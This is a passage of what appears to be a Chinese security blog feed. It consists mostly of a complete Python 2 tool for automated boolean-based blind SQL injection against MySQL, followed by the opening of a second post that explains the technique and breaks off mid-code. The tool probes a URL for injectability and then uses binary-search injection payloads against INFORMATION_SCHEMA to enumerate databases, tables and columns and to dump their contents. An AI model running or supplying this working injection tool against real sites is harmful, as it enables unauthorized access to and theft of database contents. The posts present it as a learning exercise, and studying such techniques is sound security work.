class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbnum</span><span class="params">(url,basehtml)</span>:</span></div><div class="line">    i=<span class="number">1</span></div><div class="line">    s=<span class="string">""</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        count=<span class="number">0</span></div><div class="line">        low=<span class="number">48</span></div><div class="line">        high=<span class="number">57</span></div><div class="line">        <span class="keyword">while</span> low&lt;=high:</div><div class="line">            mid=(low+high)/<span class="number">2</span></div><div class="line">            payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d-- "</span>%(url,i,mid)</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> basehtml==html:</div><div class="line">                low=mid+<span class="number">1</span></div><div class="line">                count+=<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                high=mid<span class="number">-1</span></div><div class="line">        <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> int(s)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbs</span><span class="params">(url,basehtml,num)</span>:</span></div><div class="line">    <span class="comment">#print "num:%s"%(num)</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        i=<span class="number">1</span></div><div class="line">        length=<span class="string">""</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            count=<span class="number">0</span></div><div class="line">            low=<span class="number">48</span></div><div class="line">            high=<span class="number">57</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(length(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit %d,1),%d,1))&gt;%d-- "</span>%(url,n,i,mid)</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="keyword">if</span> basehtml==html:</div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                    count+=<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">                length=length+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                i=i+<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">        s=<span class="string">""</span></div><div class="line">        <span class="comment">#print "len:%s"%(length)</span></div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,int(length)+<span class="number">1</span>):</div><div class="line">            low=<span class="number">0</span></div><div class="line">            high=<span class="number">126</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s and ascii(substr((select schema_name from information_schema.schemata limit %s,1),%s,1))&gt;%s-- "</span>%(url,str(n),str(c),str(mid))</div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                <span class="keyword">if</span> html==basehtml:</div><div class="line">                    <span class="comment">#print payload</span></div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            <span class="keyword">print</span> s</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gettablenum</span><span class="params">(url,basehtml,dbname)</span>:</span></div><div class="line">    i=<span class="number">1</span></div><div class="line">    s=<span class="string">""</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        count=<span class="number">0</span></div><div class="line">        low=<span class="number">48</span></div><div class="line">        high=<span class="number">57</span></div><div class="line">        <span class="keyword">while</span> low&lt;=high:</div><div class="line">            mid=(low+high)/<span class="number">2</span></div><div class="line">            payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x%s),%d,1))&gt;%d-- "</span>%(url,dbname.encode(<span class="string">"hex"</span>),i,mid)</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> basehtml==html:</div><div class="line">                low=mid+<span class="number">1</span></div><div class="line">                count+=<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                high=mid<span class="number">-1</span></div><div class="line">        <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> int(s)       </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gettables</span><span class="params">(url,basehtml,num,dbname)</span>:</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"num:%s"</span>%(num)</div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        i=<span class="number">1</span></div><div class="line">        length=<span class="string">""</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            count=<span class="number">0</span></div><div class="line">            low=<span class="number">48</span></div><div class="line">            high=<span class="number">57</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(length(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x%s limit %d,1),%d,1))&gt;%d-- "</span>%(url,dbname.encode(<span class="string">"hex"</span>),n,i,mid)</div><div class="line">                <span class="keyword">print</span> payload</div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="keyword">if</span> basehtml==html:</div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                    count+=<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">                length=length+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                i=i+<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">        s=<span class="string">""</span></div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,int(length)+<span class="number">1</span>):</div><div class="line">            low=<span class="number">0</span></div><div class="line">            high=<span class="number">126</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s and ascii(substr((select table_name from information_schema.tables where table_schema=0x%s limit %s,1),%s,1))&gt;%s-- "</span>%(url,dbname.encode(<span class="string">"hex"</span>),str(n),str(c),str(mid))</div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                <span class="keyword">if</span> html==basehtml:</div><div class="line">                    <span class="comment">#print payload</span></div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            <span class="keyword">print</span> s</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcolumnnum</span><span class="params">(url,basehtml,tablename,dbname)</span>:</span></div><div class="line">    i=<span class="number">1</span></div><div class="line">    s=<span class="string">""</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        count=<span class="number">0</span></div><div class="line">        low=<span class="number">48</span></div><div class="line">        high=<span class="number">57</span></div><div class="line">        <span class="keyword">while</span> low&lt;=high:</div><div class="line">            mid=(low+high)/<span class="number">2</span></div><div class="line">            payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x%s AND TABLE_SCHEMA=0x%s),%d,1))&gt;%d-- "</span>%(url,tablename.encode(<span class="string">"hex"</span>),dbname.encode(<span class="string">"hex"</span>),i,mid)</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> basehtml==html:</div><div class="line">                low=mid+<span class="number">1</span></div><div class="line">                count+=<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                high=mid<span class="number">-1</span></div><div class="line">        <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> int(s) </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcolumns</span><span class="params">(url,basehtml,num,tablename,dbname)</span>:</span></div><div class="line">    <span class="comment">#print "num:%s"%(num)</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        i=<span class="number">1</span></div><div class="line">        length=<span class="string">""</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            count=<span class="number">0</span></div><div class="line">            low=<span class="number">48</span></div><div class="line">            high=<span class="number">57</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(length(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x%s AND TABLE_SCHEMA=0x%s limit %d,1),%d,1))&gt;%d-- "</span>%(url,tablename.encode(<span class="string">"hex"</span>),dbname.encode(<span class="string">"hex"</span>),n,i,mid)</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="keyword">if</span> basehtml==html:</div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                    count+=<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">                length=length+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                i=i+<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">        s=<span class="string">""</span></div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,int(length)+<span class="number">1</span>):</div><div class="line">            low=<span class="number">0</span></div><div class="line">            high=<span class="number">126</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s and ascii(substr((select column_name from information_schema.columns where table_name=0x%s and table_schema=0x%s limit %s,1),%s,1))&gt;%s-- "</span>%(url,tablename.encode(<span class="string">"hex"</span>),dbname.encode(<span class="string">"hex"</span>),str(n),str(c),str(mid))</div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                <span class="keyword">if</span> html==basehtml:</div><div class="line">                    <span class="comment">#print payload</span></div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            <span class="keyword">print</span> s</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdatanum</span><span class="params">(url,basehtml,tablename,dbname)</span>:</span></div><div class="line">    i=<span class="number">1</span></div><div class="line">    s=<span class="string">""</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        count=<span class="number">0</span></div><div class="line">        low=<span class="number">48</span></div><div class="line">        high=<span class="number">57</span></div><div class="line">        <span class="keyword">while</span> low&lt;=high:</div><div class="line">            mid=(low+high)/<span class="number">2</span></div><div class="line">            payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),%d,1))&gt;%d-- "</span>%(url,dbname,tablename,i,mid)</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> basehtml==html:</div><div class="line">                low=mid+<span class="number">1</span></div><div class="line">                count+=<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                high=mid<span class="number">-1</span></div><div class="line">        <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> int(s)     </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumpdatas</span><span class="params">(url,basehtml,num,columnname,tablename,dbname)</span>:</span></div><div class="line">    <span class="comment">#print "num:%s"%(num)</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        i=<span class="number">1</span></div><div class="line">        length=<span class="string">""</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            count=<span class="number">0</span></div><div class="line">            low=<span class="number">48</span></div><div class="line">            high=<span class="number">57</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(length(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),%d,1))&gt;%d-- "</span>%(url,columnname,dbname,tablename,n,i,mid)</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="keyword">if</span> basehtml==html:</div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                    count+=<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">                length=length+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                i=i+<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">        s=<span class="string">""</span></div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,int(length)+<span class="number">1</span>):</div><div class="line">            low=<span class="number">0</span></div><div class="line">            high=<span class="number">126</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s and ascii(substr((select %s from %s.%s limit %s,1),%s,1))&gt;%s-- "</span>%(url,columnname,dbname,tablename,str(n),str(c),str(mid))</div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                <span class="keyword">if</span> html==basehtml:</div><div class="line">                    <span class="comment">#print payload</span></div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            <span class="keyword">print</span> s</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">testurl</span><span class="params">(url,basehtml)</span>:</span></div><div class="line">    url1=<span class="string">"%s'"</span>%(url)</div><div class="line">    url2=<span class="string">'%s"'</span>%(url)</div><div class="line">    html1=requests.get(url1).content</div><div class="line">    html2=requests.get(url2).content</div><div class="line">    <span class="keyword">if</span> basehtml!=html1 <span class="keyword">and</span> basehtml!=html2:</div><div class="line">        <span class="comment">#print "this url maybe injectable,type numeric"</span></div><div class="line">        <span class="keyword">return</span> url</div><div class="line">    <span class="keyword">elif</span> basehtml!=html1 <span class="keyword">and</span> basehtml==html2:</div><div class="line">        <span class="comment">#print "this url maybe injectable,type string(\")"</span></div><div class="line">        <span class="keyword">return</span> url1</div><div class="line">    <span class="keyword">elif</span> basehtml==html1 <span class="keyword">and</span> basehtml!=html2:</div><div class="line">        <span class="comment">#print "this url maybe injectable,type string(\")"</span></div><div class="line">        <span class="keyword">return</span> url2</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    parser=OptionParser()</div><div class="line">    parser.add_option(<span class="string">"-u"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"url"</span>,help=<span class="string">"-u url"</span>)</div><div class="line">    parser.add_option(<span class="string">"-C"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"column"</span>,help=<span class="string">"-C column1,column2,...,..."</span>)</div><div class="line">    parser.add_option(<span class="string">"-T"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"table"</span>,help=<span class="string">"-T table"</span>)</div><div class="line">    parser.add_option(<span class="string">"-D"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"db"</span>,help=<span class="string">"-D dadabase"</span>)</div><div class="line">    parser.add_option(<span class="string">"--dbs"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"dbs"</span>,help=<span class="string">"inject all databases"</span>)</div><div class="line">    parser.add_option(<span class="string">"--dump"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"dump"</span>,help=<span class="string">"dump columns with selected table and database"</span>)</div><div class="line">    parser.add_option(<span class="string">"--tables"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"tables"</span>,help=<span class="string">"inject all tables in selected database"</span>)</div><div class="line">    parser.add_option(<span class="string">"--columns"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"columns"</span>,help=<span class="string">"inject all columns in selected table and database"</span>)</div><div class="line">    (options,args)=parser.parse_args()</div><div class="line">    <span class="keyword">if</span> options.url <span class="keyword">and</span> len(sys.argv)==<span class="number">3</span>:</div><div class="line">        url=options.url</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        result=testurl(url,basehtml)</div><div class="line">        <span class="keyword">if</span> result:</div><div class="line">            <span class="keyword">print</span> <span class="string">"this url maybe injectable"</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">"this url maybe notinjectable"</span></div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.dbs:<span class="comment">#--dbs</span></div><div class="line">        url=options.url</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=getdbnum(url,basehtml)</div><div class="line">        getdbs(url,basehtml,num)</div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.tables <span class="keyword">and</span> options.db:<span class="comment">#-u url --tables -D database</span></div><div class="line">        url=options.url</div><div class="line">        db=options.db</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=gettablenum(url,basehtml,db)</div><div class="line">        gettables(url,basehtml,num,db)</div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.columns <span class="keyword">and</span> options.table <span class="keyword">and</span> options.db:<span class="comment">#-u url --columns -T table -D database</span></div><div class="line">        url=options.url</div><div class="line">        table=options.table</div><div class="line">        db=options.db</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=getcolumnnum(url,basehtml,table,db)</div><div class="line">        getcolumns(url,basehtml,num,table,db)</div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.dump <span class="keyword">and</span> options.column <span class="keyword">and</span> options.table <span class="keyword">and</span> options.db:<span class="comment">#-u url --dump  -C column -T table -D database</span></div><div class="line">        url=options.url</div><div class="line">        column=options.column</div><div class="line">        table=options.table</div><div class="line">        db=options.db</div><div class="line">        columns=column.split(<span class="string">","</span>)</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=getdatanum(url,basehtml,table,db)</div><div class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> columns:</div><div class="line">            dumpdatas(url,basehtml,num,column,table,db)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="comment">#print "Please look this script help information,to use --help or -h"</span></div><div class="line">        parser.print_help()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python布尔盲注脚本算法完善&quot;&gt;&lt;a href=&quot;#python布尔盲注脚本算法完善&quot; class=&quot;headerlink&quot; title=&quot;python布尔盲注脚本算法完善&quot;&gt;&lt;/a&gt;python布尔盲注脚本算法完善&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;完善一下上次写的python盲注工具，之前那个盲注工具在猜取字符的时候使用的二分法，通过查找&lt;code&gt;0-126&lt;/code&gt;这个范围去采取数据库中的数据。但是当时遗留了一个问题，就是在逐个猜解数据库字符时使用二分法并没有什么问题，这时因为字符都在&lt;code&gt;0-126&lt;/code&gt;这个固定范围内，但是在猜取数据库个数、指定数据库的表个数、字段个数或者表中记录条数时，又或者是数据库名的长度、表名长度、字段名的长度时是没有一个固定的范围的，举个例子，比如在猜取表中记录个数时，记录的个数是不能确定范围的，也就是不能确定二分法的最大值，当时采用了循环自加的方式去判断，速度自然是慢了许多。今天抽时间读了一下sqlmap的payload，通过payload发现sqlmap也考虑到了这种情况，并且处理方法还是不错的。对于这种情况还是可以通过二分法判断的，将自己的方法记录一下~&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://lawlietweb.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://lawlietweb.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python编程实现自动化注入之布尔盲注</title>
    <link href="http://lawlietweb.com/2018/06/05/pyblindsqli/"/>
    <id>http://lawlietweb.com/2018/06/05/pyblindsqli/</id>
    <published>2018-06-04T17:22:39.000Z</published>
    <updated>2018-12-19T11:21:36.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python编程实现自动化注入之布尔盲注"><a href="#python编程实现自动化注入之布尔盲注" class="headerlink" title="python编程实现自动化注入之布尔盲注"></a>python编程实现自动化注入之布尔盲注</h1><p><strong>python编程实现自动化注入这个话题很有可能会写成一个系列，主要希望通过编写自动化注入工具脚本来提高自己的python代码能力和sql注入的能力，mysql数据库常见的注入分为union注入，报错注入，布尔盲注和时间盲注，这篇文章先用布尔盲注工具的编写来开个头~主要会用到optparse库去解析命令行参数，同时会用到二分有序查找算法去猜解数据库的每个字符，optparse库的用法和二分法的好处在之前的文章里都写的很清楚了，开始编写吧</strong><br><a id="more"></a></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>布尔盲注这种注入手法主要用于页面没有回显位置而且没有报错信息的情况下，这时可以构造逻辑判断，通过页面返回的不同去判断逻辑的真假从而猜取数据库的字符</strong></p><p><strong>所以可以通过python脚本循环猜解出数据库中的内容，二分法猜解字符会比一次次循环累加要快很多，主要的思路就是先用requests请求一个正常的页面，当然这个页面是存在sql注入的，然后通过requests请求加上单双引号的url所返回的页面，通过和正常页面对比来判断为数字型注入还是字符型注入，判断的方法</strong></p><pre><code>url参数后加单引号与双引号均报错，则为数字型注入url参数后加单引号报错双引号不报错，为字符型注入且参数外为单引号url参数后加单引号不报错双引号报错，为字符型注入且参数外为双引号</code></pre><p><strong>接着就是根据页面的不同判断数据库的个数和每个数据库名的长度，然后通过二分法指定范围<code>(0-126)</code>判断出来每个数据库的名字，然后采取相同的方法判断出来指定数据库下的表名，指定数据库表名下的字段名以及数据库里的数据</strong></p><p><strong>为了更方便的理解使用，我用python写了一个盲注二分法算法模型</strong></p><p><strong>模型1:</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(num)</span>:</span></div><div class="line">    low=<span class="number">0</span></div><div class="line">    high=<span class="number">126</span></div><div class="line">    <span class="keyword">while</span> low&lt;=high:</div><div class="line">        <span class="keyword">print</span> <span class="string">"search zone:(%d-%d)"</span>%(low,high)</div><div class="line">        mid=(low+high)/<span class="number">2</span></div><div class="line">        <span class="keyword">if</span> mid&lt;num:</div><div class="line">            low=mid+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            high=mid<span class="number">-1</span></div><div class="line">    <span class="keyword">return</span> 